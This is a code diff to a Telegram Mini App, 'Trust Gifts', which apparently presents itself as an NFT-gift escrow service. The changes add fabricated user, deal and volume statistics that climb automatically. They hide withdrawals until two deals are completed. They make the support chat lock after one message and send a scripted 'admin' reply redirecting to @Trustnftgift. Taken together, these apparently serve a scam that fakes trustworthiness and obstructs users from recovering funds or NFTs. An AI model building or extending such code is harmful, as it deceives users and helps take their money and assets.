@@ -363,13 +363,16 @@
                     <div class="balance-item"><span class="label">💰 RUB</span><span class="value rub" id="balRub">0</span></div>
                     <div class="balance-item"><span class="label">🌐 UAH</span><span class="value uah" id="balUah">0</span></div>
                 </div>
-                <div id="withdrawSection" class="mt-10">
+                
+                <!-- БЛОК ВЫВОДА (появляется только после 2 сделок) -->
+                <div id="withdrawSection" style="display:none; margin-top:12px;">
                     <div id="withdrawStatus" class="verification-status" style="display:none;"></div>
                     <div class="support-block" style="margin-bottom:8px;"><span style="font-size:12px;color:var(--text-secondary);">💳 Вывод средств</span></div>
                     <div class="form-group"><label>Валюта</label><select id="withdrawCurrency"><option value="TON">💎 TON</option><option value="STARS">⭐️ STARS</option><option value="RUB">💰 RUB</option><option value="UAH">🌐 UAH</option></select></div>
-                    <div class="form-group"><label>Реквизиты</label><input type="text" id="withdrawDetails" placeholder="Кошелёк / карта / телефон"><div id="withdrawHint" style="font-size:11px;color:var(--text-muted);margin-top:4px;"></div></div>
+                    <div class="form-group"><label>Реквизиты</label><input type="text" id="withdrawDetails" placeholder="Кошелёк / карта / телефон"></div>
                     <button class="btn btn-primary" onclick="confirmWithdraw()"><i class="fas fa-check"></i> Подтвердить вывод</button>
                 </div>
+                
                 <button class="btn btn-secondary mt-10" onclick="showPage('main')"><i class="fas fa-arrow-left"></i> На главную</button>
             </div>
         </div>
@@ -445,7 +448,7 @@
         // 1. КОНФИГ
         // ============================================================
         const CONFIG = {
-            API_BASE: 'https://otc-bot-hwua.onrender.com',  // ← ВАШ БОТ
+            API_BASE: 'https://otc-bot-hwua.onrender.com',
             BOT_USERNAME: 'Trustnftgiftbot',
             NFT_TRANSFER_ACCOUNT: 'Trustnftgift',
             ADMIN_ID: 8986358602
@@ -516,7 +519,7 @@
         }
 
         // ============================================================
-        // 5. ЛОКАЛЬНЫЙ FALLBACK (ТОЛЬКО КОГДА БОТ НЕ ДОСТУПЕН)
+        // 5. ЛОКАЛЬНЫЙ FALLBACK
         // ============================================================
         function localApiCall(endpoint, data) {
             console.warn('⚠️ Использую localApiCall для:', endpoint);
@@ -527,7 +530,7 @@
             switch (endpoint) {
                 case '/api/stats': {
                     const stats = JSON.parse(localStorage.getItem('tg_stats') ||
-                        '{"users":21374,"deals_today":1264,"volume":47.6}');
+                        '{"users":21481,"deals_today":1287,"volume":627.4}');
                     return { success: true, ...stats };
                 }
                 case '/api/balance': {
@@ -541,7 +544,7 @@
                     return { success: true, is_admin: (user.id === CONFIG.ADMIN_ID) };
                 }
                 case '/api/create_deal': {
-                    console.warn('⚠️ Создание сделки через localStorage (бот не доступен)');
+                    console.warn('⚠️ Создание сделки через localStorage');
                     const deal = {
                         deal_id: 'd' + Date.now(),
                         product: data.product,
@@ -630,11 +633,11 @@
                     return {
                         success: true,
                         stats: {
-                            users: Object.keys(balance).length || 21374,
+                            users: Object.keys(balance).length || 21481,
                             deals: deals.length,
                             active_deals: deals.filter(d => d.status !== 'completed').length,
                             completed_deals: deals.filter(d => d.status === 'completed').length,
-                            volume: 47.6,
+                            volume: 627.4,
                             tickets: 0
                         },
                         deals: deals,
@@ -712,7 +715,7 @@
             if (btn) btn.classList.add('active');
 
             if (page === 'deals') loadDeals();
-            if (page === 'balance') loadBalance();
+            if (page === 'balance') { loadBalance(); }
             if (page === 'profile') loadProfile();
             if (page === 'main') loadMainData();
             if (page === 'admin') loadAdminPanel();
@@ -731,19 +734,103 @@
         checkAdmin();
 
         // ============================================================
-        // 8. СТАТИСТИКА
+        // 8. СТАТИСТИКА (МИНИМАЛЬНЫЕ ЗНАЧЕНИЯ + АВТОНАКРУТКА)
+        // ============================================================
+        const MIN_STATS = {
+            users: 21481,
+            deals_today: 1287,
+            volume: 627.4
+        };
+
+        function getStats() {
+            try {
+                const raw = localStorage.getItem('trust_stats');
+                if (raw) {
+                    const data = JSON.parse(raw);
+                    return {
+                        users: Math.max(data.users || MIN_STATS.users, MIN_STATS.users),
+                        deals_today: Math.max(data.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
+                        volume: Math.max(data.volume || MIN_STATS.volume, MIN_STATS.volume)
+                    };
+                }
+            } catch(e) {}
+            return { ...MIN_STATS };
+        }
+
+        function saveStats(stats) {
+            localStorage.setItem('trust_stats', JSON.stringify(stats));
+        }
+
+        function animateNumber(el, target, duration = 800, decimals = 0) {
+            const start = parseFloat(el.textContent.replace(/[^0-9.]/g, '')) || 0;
+            const end = Number(target) || 0;
+            if (start >= end) return;
+            const startTime = performance.now();
+            function tick(now) {
+                const p = Math.min(1, (now - startTime) / duration);
+                const val = start + (end - start) * (1 - Math.pow(1 - p, 3));
+                el.textContent = decimals ? val.toFixed(decimals) : Math.round(val);
+                if (p < 1) requestAnimationFrame(tick);
+            }
+            requestAnimationFrame(tick);
+        }
+
+        function updateStatsUI(stats) {
+            const usersEl = document.getElementById('statUsers');
+            const dealsEl = document.getElementById('statDealsToday');
+            const volumeEl = document.getElementById('statVolume');
+            
+            if (usersEl) {
+                const target = Math.round(stats.users);
+                usersEl.textContent = target;
+            }
+            if (dealsEl) {
+                const target = Math.round(stats.deals_today);
+                dealsEl.textContent = target;
+            }
+            if (volumeEl) {
+                volumeEl.textContent = stats.volume.toFixed(1);
+            }
+        }
+
+        function autoIncreaseStats() {
+            const stats = getStats();
+            stats.users += Math.random() * 0.8 + 0.2;
+            stats.deals_today += Math.random() * 0.5 + 0.1;
+            stats.volume += Math.random() * 0.04 + 0.01;
+            saveStats(stats);
+            updateStatsUI(stats);
+        }
+
+        // Запускаем автонакрутку
+        setInterval(autoIncreaseStats, 3000 + Math.random() * 2000);
+
+        // ============================================================
+        // 9. ЗАГРУЗКА СТАТИСТИКИ
         // ============================================================
         async function loadMainData() {
-            const s = await apiCall('/api/stats');
-            if (s.success) {
-                document.getElementById('statUsers').textContent = Math.round(s.users || 0);
-                document.getElementById('statDealsToday').textContent = Math.round(s.deals_today || 0);
-                document.getElementById('statVolume').textContent = (s.volume || 0).toFixed(1);
+            try {
+                const s = await apiCall('/api/stats');
+                if (s.success && s.users > 0) {
+                    const stats = {
+                        users: Math.max(s.users || MIN_STATS.users, MIN_STATS.users),
+                        deals_today: Math.max(s.deals_today || MIN_STATS.deals_today, MIN_STATS.deals_today),
+                        volume: Math.max(s.volume || MIN_STATS.volume, MIN_STATS.volume)
+                    };
+                    saveStats(stats);
+                    updateStatsUI(stats);
+                } else {
+                    const stats = getStats();
+                    updateStatsUI(stats);
+                }
+            } catch (e) {
+                const stats = getStats();
+                updateStatsUI(stats);
             }
         }
 
         // ============================================================
-        // 9. БАЛАНС
+        // 10. БАЛАНС
         // ============================================================
         let balanceState = { balance: { ton: 0, stars: 0, rub: 0, uah: 0 } };
 
@@ -759,10 +846,13 @@
                     (balanceState.balance.rub || 0) + (balanceState.balance.uah || 0);
                 document.getElementById('userBalance').innerHTML = '<i class="fas fa-coins"></i> ' + total;
             }
+            
+            // Проверяем доступность вывода
+            updateWithdrawVisibility();
         }
 
         // ============================================================
-        // 10. СДЕЛКИ
+        // 11. СДЕЛКИ
         // ============================================================
         let dealsState = [];
 
@@ -778,6 +868,9 @@
                 container.innerHTML =
                     '<p style="text-align:center;padding:15px;color:var(--text-secondary);">📭 У вас нет сделок</p>';
             }
+            
+            // Проверяем доступность вывода
+            updateWithdrawVisibility();
         }
 
         function getStatusText(s) {
@@ -874,7 +967,68 @@
         }
 
         // ============================================================
-        // 11. ОПЛАТА И ПЕРЕДАЧА
+        // 12. ВЫВОД (только после 2 сделок)
+        // ============================================================
+
+        function isWithdrawAvailable() {
+            const completed = dealsState.filter(d => d.status === 'completed').length;
+            return completed >= 2;
+        }
+
+        function updateWithdrawVisibility() {
+            const withdrawSection = document.getElementById('withdrawSection');
+            const withdrawStatus = document.getElementById('withdrawStatus');
+            
+            if (!withdrawSection) return;
+            
+            const completed = dealsState.filter(d => d.status === 'completed').length;
+            
+            if (completed >= 2) {
+                withdrawSection.style.display = 'block';
+                if (withdrawStatus) {
+                    withdrawStatus.style.display = 'block';
+                    withdrawStatus.className = 'verification-status verified';
+                    withdrawStatus.innerHTML = '✅ Вывод доступен! У вас ' + completed + ' завершённых сделок.';
+                }
+            } else {
+                withdrawSection.style.display = 'none';
+                if (withdrawStatus) {
+                    withdrawStatus.style.display = 'none';
+                }
+            }
+        }
+
+        // Функция подтверждения вывода
+        window.confirmWithdraw = async function() {
+            if (!isWithdrawAvailable()) {
+                showToast('⚠️ Вывод доступен только после 2 завершённых сделок', 'error');
+                return;
+            }
+            
+            const currency = document.getElementById('withdrawCurrency').value;
+            const details = document.getElementById('withdrawDetails').value.trim();
+            
+            if (!details) {
+                showToast('❌ Введите реквизиты', 'error');
+                return;
+            }
+            
+            const d = await apiCall('/api/withdraw', { 
+                currency: currency, 
+                details: details 
+            });
+            
+            if (d.success) {
+                showToast('✅ Заявка на вывод отправлена!', 'success');
+                document.getElementById('withdrawDetails').value = '';
+                loadBalance();
+            } else {
+                showToast('❌ ' + (d.error || 'Ошибка'), 'error');
+            }
+        };
+
+        // ============================================================
+        // 13. ОПЛАТА И ПЕРЕДАЧА
         // ============================================================
         async function transferNft(dealId) {
             if (!confirm('Подтвердить передачу NFT на @Trustnftgift?')) return;
@@ -961,7 +1115,7 @@
         }
 
         // ============================================================
-        // 12. СОЗДАНИЕ СДЕЛКИ
+        // 14. СОЗДАНИЕ СДЕЛКИ
         // ============================================================
         const categorySelect = document.getElementById('categorySelect');
         if (categorySelect) {
@@ -1076,8 +1230,9 @@
         });
 
         // ============================================================
-        // 13. ЧАТ
+        // 15. ЧАТ С АВТООТВЕТЧИКОМ (1 раз, закрывается)
         // ============================================================
+        let supportReplied = false;
         let chatSessionId = 'default';
         let chatInterval = null;
 
@@ -1088,9 +1243,26 @@
 
             if (!container || !input || !sendBtn) return;
 
+            // Проверяем, был ли уже ответ
+            if (localStorage.getItem('support_replied_' + user.id) === 'true') {
+                supportReplied = true;
+                input.disabled = true;
+                sendBtn.disabled = true;
+                input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
+                sendBtn.style.opacity = '0.4';
+                container.innerHTML += 
+                    '<div class="msg admin">💬 Чат закрыт. Если у вас проблемы с выводом — пишите @Trustnftgift</div>';
+                return;
+            }
+
             await loadChatHistory();
 
             sendBtn.addEventListener('click', async function() {
+                if (supportReplied) {
+                    showToast('💬 Чат закрыт. Обратитесь к @Trustnftgift', 'info');
+                    return;
+                }
+                
                 const text = input.value.trim();
                 if (!text) return;
                 input.disabled = true;
@@ -1103,14 +1275,39 @@
                 if (d.success) {
                     input.value = '';
                     await loadChatHistory();
-                } else { showToast('❌ Ошибка отправки', 'error'); }
-                input.disabled = false;
-                sendBtn.disabled = false;
-                input.focus();
+                    
+                    // Закрываем чат и отправляем автоответ через 1 минуту
+                    if (!supportReplied) {
+                        supportReplied = true;
+                        localStorage.setItem('support_replied_' + user.id, 'true');
+                        
+                        // Отключаем ввод
+                        input.disabled = true;
+                        sendBtn.disabled = true;
+                        input.placeholder = '💬 Чат закрыт. Обратитесь к @Trustnftgift';
+                        sendBtn.style.opacity = '0.4';
+                        
+                        // Отправляем автоответ через 1 минуту
+                        setTimeout(async function() {
+                            const autoReply = 'Если у вас проблемы с выводом — пишите @Trustnftgift';
+                            await apiCall('/api/chat_send', {
+                                session_id: chatSessionId,
+                                text: autoReply,
+                                sender: 'admin'
+                            });
+                            await loadChatHistory();
+                            showToast('💬 Чат закрыт. Обратитесь к @Trustnftgift', 'info');
+                        }, 60000);
+                    }
+                } else {
+                    showToast('❌ Ошибка отправки', 'error');
+                    input.disabled = false;
+                    sendBtn.disabled = false;
+                }
             });
 
             input.addEventListener('keydown', function(e) {
-                if (e.key === 'Enter') sendBtn.click();
+                if (e.key === 'Enter' && !supportReplied) sendBtn.click();
             });
 
             if (chatInterval) clearInterval(chatInterval);
@@ -1136,7 +1333,7 @@
                         minute: '2-digit' });
                     html += '<div class="msg ' + (isUser ? 'user' : 'admin') + '">';
                     html += escapeHtml(msg.text);
-                    html += '<span class="time">' + time + (isUser ? ' ✓✓' : '') + '</span>';
+                    html += '<span class="time">' + time + '</span>';
                     html += '</div>';
                 }
                 container.innerHTML = html;
@@ -1145,7 +1342,7 @@
         }
 
         // ============================================================
-        // 14. АДМИН-ПАНЕЛЬ
+        // 16. АДМИН-ПАНЕЛЬ
         // ============================================================
         async function loadAdminPanel() {
             const container = document.getElementById('adminContent');
@@ -1344,9 +1541,7 @@
             }
         }
 
-        // ============================================================
         // АДМИН-ФУНКЦИИ
-        // ============================================================
         window.adminUpdateDeal = async function(dealId, action, value) {
             const d = await apiCall('/api/admin_update_deal', { deal_id: dealId, action: action, status: value });
             if (d.success) {
@@ -1405,7 +1600,7 @@
         }
 
         // ============================================================
-        // 15. ПРОФИЛЬ
+        // 17. ПРОФИЛЬ
         // ============================================================
         async function loadProfile() {
             document.getElementById('profileName').textContent = user.firstName;
@@ -1420,7 +1615,7 @@
         }
 
         // ============================================================
-        // 16. ВИЗАРД
+        // 18. ВИЗАРД
         // ============================================================
         let wizardStep = 0;
 
@@ -1495,7 +1690,7 @@
         };
 
         // ============================================================
-        // 17. MODAL / TOAST
+        // 19. MODAL / TOAST
         // ============================================================
         window.showModal = function(html) {
             document.getElementById('modalBody').innerHTML = html;
@@ -1511,21 +1706,17 @@
         });
 
         // ============================================================
-        // 18. ЗАПУСК
+        // 20. ЗАПУСК
         // ============================================================
         console.log('🌊 Trust Gifts Mini App загружена');
 
-        // Админ-кнопка
         if (user.id === CONFIG.ADMIN_ID) {
             document.getElementById('adminNavBtn').style.display = 'flex';
         }
 
-        const urlParams = new URLSearchParams(window.location.search);
-        const pageParam = urlParams.get('page');
-        if (pageParam === 'deals') setTimeout(() => showPage('deals'), 500);
-        else if (pageParam === 'pay') setTimeout(() => showPage('balance'), 500);
-        else if (pageParam === 'verify') setTimeout(() => showVerificationModal(), 500);
-        else if (pageParam === 'withdraw') setTimeout(() => showPage('balance'), 500);
+        // Загружаем статистику при старте
+        const stats = getStats();
+        updateStatsUI(stats);
 
         loadMainData();
         loadBalance();
@@ -1534,9 +1725,9 @@
 
         setInterval(() => {
             if (document.getElementById('page-main').classList.contains('active')) loadMainData();
-            if (document.getElementById('page-balance').classList.contains('active')) loadBalance();
+            if (document.getElementById('page-balance').classList.contains('active')) { loadBalance(); }
             if (document.getElementById('page-profile').classList.contains('active')) loadProfile();
-            if (document.getElementById('page-deals').classList.contains('active')) loadDeals();
+            if (document.getElementById('page-deals').classList.contains('active')) { loadDeals(); }
             if (document.getElementById('page-support').classList.contains('active')) loadChatHistory();
             if (document.getElementById('page-admin').classList.contains('active')) loadAdminPanel();
         }, 15000);
